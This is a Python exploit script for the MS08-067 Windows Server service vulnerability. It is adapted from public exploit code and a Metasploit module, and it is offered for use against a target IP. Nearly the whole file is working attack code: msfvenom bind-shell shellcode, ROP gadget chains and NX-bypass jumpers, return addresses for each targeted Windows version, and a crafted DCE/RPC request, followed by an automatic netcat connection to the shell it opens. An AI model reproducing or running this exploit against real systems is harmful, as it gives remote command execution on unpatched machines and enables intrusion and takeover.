import struct
import time
import sys
import socket
import os as operatingsystemstuff

from threading import Thread    #Thread is imported incase you would like to modify. 


try:

    from impacket import smb

    from impacket import uuid

    from impacket import dcerpc

    from impacket.dcerpc.v5 import transport


except ImportError, _:

    print 'Install the following library to make this script work'

    print 'Impacket : http://oss.coresecurity.com/projects/impacket.html'

    print 'PyCrypto : http://www.amk.ca/python/code/crypto.html'

    print 'Note: I\'m planning an update to autopatch if missing the above, but for now just install from there.'

    sys.exit(1)


print '################################################################################'

print '#   MS08-067 Exploit'

print '#   This is a modified verion of Debasis Mohanty\'s code \n#   (https://www.exploit-db.com/exploits/7132/).'

print '#   The return addresses and the ROP parts are ported from metasploit module \n#   exploit/windows/smb/ms08_067_netapi'

print '#   This version is modified for global use, as the original had a hardcoded \n#   reverse shell IP. '

print '#   Thus, in this version, shellcode was changed to a bind shell on port 443,\n#   and a handler was built in. '

print '################################################################################\n'


#Reverse TCP shellcode from metasploit; port 443 IP 192.168.40.103; badchars \x00\x0a\x0d\x5c\x5f\x2f\x2e\x40;
#Make sure there are enough nops at the begining for the decoder to work. Payload size: 380 bytes (nopsleps are not included)
#EXITFUNC=thread Important! Omitting will crash the target SMB service, and possibly the machine!
#msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.30.77 LPORT=443  EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f python
shellcode="\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
shellcode="\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
shellcode+="\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
#REPLACEMENT SHELLCODE: msfvenom -p windows/shell_bind_tcp LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f python
buf = ""
buf += "\x2b\xc9\x83\xe9\xae\xe8\xff\xff\xff\xff\xc0\x5e\x81"
buf += "\x76\x0e\xb7\xa9\x45\x65\x83\xee\xfc\xe2\xf4\x4b\x41"
buf += "\xc7\x65\xb7\xa9\x25\xec\x52\x98\x85\x01\x3c\xf9\x75"
buf += "\xee\xe5\xa5\xce\x37\xa3\x22\x37\x4d\xb8\x1e\x0f\x43"
buf += "\x86\x56\xe9\x59\xd6\xd5\x47\x49\x97\x68\x8a\x68\xb6"
buf += "\x6e\xa7\x97\xe5\xfe\xce\x37\xa7\x22\x0f\x59\x3c\xe5"
buf += "\x54\x1d\x54\xe1\x44\xb4\xe6\x22\x1c\x45\xb6\x7a\xce"
buf += "\x2c\xaf\x4a\x7f\x2c\x3c\x9d\xce\x64\x61\x98\xba\xc9"
buf += "\x76\x66\x48\x64\x70\x91\xa5\x10\x41\xaa\x38\x9d\x8c"
buf += "\xd4\x61\x10\x53\xf1\xce\x3d\x93\xa8\x96\x03\x3c\xa5"
buf += "\x0e\xee\xef\xb5\x44\xb6\x3c\xad\xce\x64\x67\x20\x01"
buf += "\x41\x93\xf2\x1e\x04\xee\xf3\x14\x9a\x57\xf6\x1a\x3f"
buf += "\x3c\xbb\xae\xe8\xea\xc1\x76\x57\xb7\xa9\x2d\x12\xc4"
buf += "\x9b\x1a\x31\xdf\xe5\x32\x43\xb0\x56\x90\xdd\x27\xa8"
buf += "\x45\x65\x9e\x6d\x11\x35\xdf\x80\xc5\x0e\xb7\x56\x90"
buf += "\x0f\xbf\xf0\x15\x87\x4a\xe9\x15\x25\xe7\xc1\xaf\x6a"
buf += "\x68\x49\xba\xb0\x20\xc1\x47\x65\xb6\x12\xcc\x83\xdd"
buf += "\xb9\x13\x32\xdf\x6b\x9e\x52\xd0\x56\x90\x32\xdf\x1e"
buf += "\xac\x5d\x48\x56\x90\x32\xdf\xdd\xa9\x5e\x56\x56\x90"
buf += "\x32\x20\xc1\x30\x0b\xfa\xc8\xba\xb0\xdf\xca\x28\x01"
buf += "\xb7\x20\xa6\x32\xe0\xfe\x74\x93\xdd\xbb\x1c\x33\x55"
buf += "\x54\x23\xa2\xf3\x8d\x79\x64\xb6\x24\x01\x41\xa7\x6f"
buf += "\x45\x21\xe3\xf9\x13\x33\xe1\xef\x13\x2b\xe1\xff\x16"
buf += "\x33\xdf\xd0\x89\x5a\x31\x56\x90\xec\x57\xe7\x13\x23"
buf += "\x48\x99\x2d\x6d\x30\xb4\x25\x9a\x62\x12\xa5\x78\x9d"
buf += "\xa3\x2d\xc3\x22\x14\xd8\x9a\x62\x95\x43\x19\xbd\x29"
buf += "\xbe\x85\xc2\xac\xfe\x22\xa4\xdb\x2a\x0f\xb7\xfa\xba"
buf += "\xb0"
buf += "\x90"*28 #The original shellcode was 380 bytes, my replacement was 28 bytes short. These nops pad that missing length.
shellcode+=buf
nonxjmper = "\x08\x04\x02\x00%s"+"A"*4+"%s"+"A"*42+"\x90"*8+"\xeb\x62"+"A"*10
disableNXjumper = "\x08\x04\x02\x00%s%s%s"+"A"*28+"%s"+"\xeb\x02"+"\x90"*2+"\xeb\x62"
ropjumper = "\x00\x08\x01\x00"+"%s"+"\x10\x01\x04\x01";
module_base = 0x6f880000

def bindhandler():

#    try:
#        EvilSock=socket.socket() #I mean really, when given the chance, how can I /not/ name something "Evil sock"?
#        EvilSock.connect((str(target),443))
#        print("Successfully connected to bind port!")
#        prompt="Bind Prompt > " #This will change on command reception, this is just a placeholder until it gets an actual prompt.
#	while True: #Really basic but (barely) functional half-assed bind shell handler I ripped from one of my private PoCs. Feel free to change, modify, replace, whatever. So long as it works, and you commit any changes to my git for me to incorperate.
#            try:
#                command=raw_input(prompt)
#                EvilSock.send(command)
#                time.sleep(0.25)
#                out=EvilSock.recv(99999)
#                res=out.rsplit("\n",1)[0]
#                try:
#                    	prompt=out.rsplit("\n",1)[1]
#                except:
#                    	pass
#                print(str(res))
#            
#	    except KeyboardInterrupt:
#                log.info("Keyboard Interrupt. Exiting cleanly.")
#                s.send("exit")
#                s.close()
#                sys.exit(0)
#    except socket.error:
#	print("Socket error. Attempting to reconnect...")
#        time.sleep(1)
#        bindhandler()
#    except:
#	pass
##Previous handler fell short to netcat, as they always do... Just run this from Linux and you'll be fine. Hey, if you wanted all the work done for you, you shouldn't be a hacker. 
     print("\n")
     connector=("nc "+str(target)+" 443")
     operatingsystemstuff.system(connector)

def generate_rop(rvas):
	gadget1="\x90\x5a\x59\xc3"
	gadget2 = ["\x90\x89\xc7\x83", "\xc7\x0c\x6a\x7f", "\x59\xf2\xa5\x90"]	
	gadget3="\xcc\x90\xeb\x5a"	
	ret=struct.pack('<L', 0x00018000)
	ret+=struct.pack('<L', rvas['call_HeapCreate']+module_base)
	ret+=struct.pack('<L', 0x01040110)
	ret+=struct.pack('<L', 0x01010101)
	ret+=struct.pack('<L', 0x01010101)
	ret+=struct.pack('<L', rvas['add eax, ebp / mov ecx, 0x59ffffa8 / ret']+module_base)
	ret+=struct.pack('<L', rvas['pop ecx / ret']+module_base)
	ret+=gadget1
	ret+=struct.pack('<L', rvas['mov [eax], ecx / ret']+module_base)
	ret+=struct.pack('<L', rvas['jmp eax']+module_base)
	ret+=gadget2[0]
	ret+=gadget2[1]
	ret+=struct.pack('<L', rvas['mov [eax+8], edx / mov [eax+0xc], ecx / mov [eax+0x10], ecx / ret']+module_base)
	ret+=struct.pack('<L', rvas['pop ecx / ret']+module_base)
	ret+=gadget2[2]
	ret+=struct.pack('<L', rvas['mov [eax+0x10], ecx / ret']+module_base)
	ret+=struct.pack('<L', rvas['add eax, 8 / ret']+module_base)
	ret+=struct.pack('<L', rvas['jmp eax']+module_base)
	ret+=gadget3	
	return ret
class SRVSVC_Exploit(Thread):

    def __init__(self, target, os, port=445):

        super(SRVSVC_Exploit, self).__init__()

        self.__port   = port

        self.target   = target
	self.os	      = os


    def __DCEPacket(self):
	if (self.os=='1'):
		print 'Windows XP SP0/SP1 Universal\n'
		ret = "\x61\x13\x00\x01"
		jumper = nonxjmper % (ret, ret)
	elif (self.os=='2'):
		print 'Windows 2000 Universal\n'
		ret = "\xb0\x1c\x1f\x00"
		jumper = nonxjmper % (ret, ret)
	elif (self.os=='3'):
		print 'Windows 2003 SP0 Universal\n'
		ret = "\x9e\x12\x00\x01"  #0x01 00 12 9e
		jumper = nonxjmper % (ret, ret)
	elif (self.os=='4'):
		print 'Windows 2003 SP1 English\n'
		ret_dec = "\x8c\x56\x90\x7c"  #0x7c 90 56 8c dec ESI, ret @SHELL32.DLL
		ret_pop = "\xf4\x7c\xa2\x7c"  #0x 7c a2 7c f4 push ESI, pop EBP, ret @SHELL32.DLL
		jmp_esp = "\xd3\xfe\x86\x7c" #0x 7c 86 fe d3 jmp ESP @NTDLL.DLL
		disable_nx = "\x13\xe4\x83\x7c" #0x 7c 83 e4 13 NX disable @NTDLL.DLL
		jumper = disableNXjumper % (ret_dec*6, ret_pop, disable_nx, jmp_esp*2)
	elif (self.os=='5'):
		print 'Windows XP SP3 French (NX)\n'
		ret = "\x07\xf8\x5b\x59"  #0x59 5b f8 07 
		disable_nx = "\xc2\x17\x5c\x59" #0x59 5c 17 c2 
		jumper = nonxjmper % (disable_nx, ret)  #the nonxjmper also work in this case.
	elif (self.os=='6'):
		print 'Windows XP SP3 English (NX)\n'
		ret = "\x07\xf8\x88\x6f"  #0x6f 88 f8 07 
		disable_nx = "\xc2\x17\x89\x6f" #0x6f 89 17 c2 
		jumper = nonxjmper % (disable_nx, ret)  #the nonxjmper also work in this case.
	elif (self.os=='7'):
		print 'Windows XP SP3 English (AlwaysOn NX)\n'
		rvasets = {'call_HeapCreate': 0x21286,'add eax, ebp / mov ecx, 0x59ffffa8 / ret' : 0x2e796,'pop ecx / ret':0x2e796 + 6,'mov [eax], ecx / ret':0xd296,'jmp eax':0x19c6f,'mov [eax+8], edx / mov [eax+0xc], ecx / mov [eax+0x10], ecx / ret':0x10a56,'mov [eax+0x10], ecx / ret':0x10a56 + 6,'add eax, 8 / ret':0x29c64}
		jumper = generate_rop(rvasets)+"AB"  #the nonxjmper also work in this case.
	else:
		print 'Not supported OS version\n'
		sys.exit(-1)
	print '[-]Initiating connection'

        self.__trans = transport.DCERPCTransportFactory('ncacn_np:%s[\\pipe\\browser]' % self.target)

        self.__trans.connect()

        print '[-]connected to ncacn_np:%s[\\pipe\\browser]' % self.target

        self.__dce = self.__trans.DCERPC_class(self.__trans)

        self.__dce.bind(uuid.uuidtup_to_bin(('4b324fc8-1670-01d3-1278-5a47bf6ee188', '3.0')))




        path ="\x5c\x00"+"ABCDEFGHIJ"*10 + shellcode +"\x5c\x00\x2e\x00\x2e\x00\x5c\x00\x2e\x00\x2e\x00\x5c\x00" + "\x41\x00\x42\x00\x43\x00\x44\x00\x45\x00\x46\x00\x47\x00"  + jumper + "\x00" * 2

        server="\xde\xa4\x98\xc5\x08\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x41\x00\x42\x00\x43\x00\x44\x00\x45\x00\x46\x00\x47\x00\x00\x00"
        prefix="\x02\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x5c\x00\x00\x00"

        self.__stub=server+"\x36\x01\x00\x00\x00\x00\x00\x00\x36\x01\x00\x00" + path +"\xE8\x03\x00\x00"+prefix+"\x01\x10\x00\x00\x00\x00\x00\x00"

        return



    def run(self):

        self.__DCEPacket()

        self.__dce.call(0x1f, self.__stub) 
        time.sleep(5)
        print 'Exploit finish\n'
	print 'Opening handler in \nThree...'
	time.sleep(1)
	print 'Two...'
	time.sleep(1)
	print 'One...'
	time.sleep(1)
	print 'Launching bind shell handler.'
	bindhandler()


if __name__ == '__main__':

       try:

           target = sys.argv[1]
	   os = sys.argv[2]

       except IndexError:

				print '\nUsage: %s <target ip>\n' % sys.argv[0]

				print 'Example: MS08_067.py 192.168.1.1 1 for Windows XP SP0/SP1 Universal\n'
				print 'Example: MS08_067.py 192.168.1.1 2 for Windows 2000 Universal\n'

				sys.exit(-1)



current = SRVSVC_Exploit(target, os)

current.start()

